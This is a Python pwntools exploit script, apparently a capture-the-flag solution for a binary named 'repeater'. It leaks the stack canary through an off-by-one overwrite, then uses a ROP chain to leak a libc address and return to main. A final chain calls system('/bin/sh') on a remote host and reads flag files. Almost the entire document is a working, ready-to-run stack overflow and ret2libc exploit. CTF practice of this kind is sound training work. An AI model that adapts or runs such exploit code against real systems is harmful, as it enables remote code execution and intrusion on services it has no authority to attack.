from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./repeater"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

# vuln: char buf[0x28] @ rbp-0x30, canary @ rbp-0x8, saved RIP @ rbp+8
# frame is sub rsp,0x30 but the buffer only occupies rbp-0x30 .. rbp-0x9
OFFSET = 0x28
POP_RDI = 0x400933          # 5f c3  (inside __libc_csu_init tail: pop rbx; pop rbp; pop r12..)
RET = 0x400934              # c3
PUTS_PLT = 0x400610
READ_GOT = 0x601030
MAIN = 0x4007D9

PROMPT = b"Please enter it to me:"
ASK = b"Do you want to continue?"


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 18_repeater_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        path = "/lib/x86_64-linux-gnu/libc.so.6"
    if not path:
        raise SystemExit("[-] set LIBC=/path/to/libc.so.6 for the remote target")
    return ELF(path, checksec=False)


def iteration(p, payload, answer):
    """One loop pass: read(0, buf, 0x100) -> puts(buf) -> scanf("%d") -> getchar()."""
    p.send(payload)
    out = p.recvuntil(ASK)
    p.sendline(answer)
    return out


def leak_canary(p):
    # buf[0x30] then the canary.  read() leaves the canary's NUL LSB untouched,
    # so overwrite exactly one byte past the buffer to make puts() print the
    # remaining 7 canary bytes too.  read() may return short, hence the retry.
    out = iteration(p, b"A" * OFFSET + b"B", b"0")
    line = out.split(b"\n")[0]
    if not line.startswith(b"A" * OFFSET + b"B"):
        raise RuntimeError("canary leak garbled: %r" % line[:0x40])
    tail = line[OFFSET + 1:OFFSET + 1 + 7]
    if len(tail) != 7:
        raise RuntimeError("canary leak truncated (%d bytes)" % len(tail))
    return u64(b"\x00" + tail)


def exploit():
    libc = resolve_libc()

    canary = None
    for attempt in range(5):
        p = start()
        p.recvuntil(PROMPT)
        try:
            canary = leak_canary(p)
            break
        except RuntimeError as e:
            log.warning("attempt %d: %s" % (attempt + 1, e))
            p.close()
    if canary is None:
        raise SystemExit("[-] could not leak canary, rerun")
    log.success("canary = %#x" % canary)

    # ---- stage 2: leak read@got, then return to main ------------------------
    p.recvuntil(PROMPT)
    chain = p64(canary) + p64(0)                       # canary + saved rbp
    chain += p64(POP_RDI) + p64(READ_GOT) + p64(PUTS_PLT) + p64(MAIN)
    iteration(p, b"A" * OFFSET + chain, b"1")

    p.recvuntil(b"stupid!!!\n")
    raw = p.recvn(6)
    read_addr = u64(raw.ljust(8, b"\x00"))
    libc_base = read_addr - libc.symbols["read"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        "read = %#x, libc = %#x, system = %#x" % (read_addr, libc_base, system)
    )

    # ---- stage 3: system("/bin/sh") ----------------------------------------
    p.recvuntil(PROMPT)
    chain = p64(canary) + p64(0)
    chain += p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
    iteration(p, b"A" * OFFSET + chain, b"1")

    time.sleep(0.3)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    elif "__PWNED__" in out:
        print("[+] __PWNED__ (shell works, no flag file next to the binary)")
    else:
        print("[-] failed, raw output above")


if __name__ == "__main__":
    exploit()
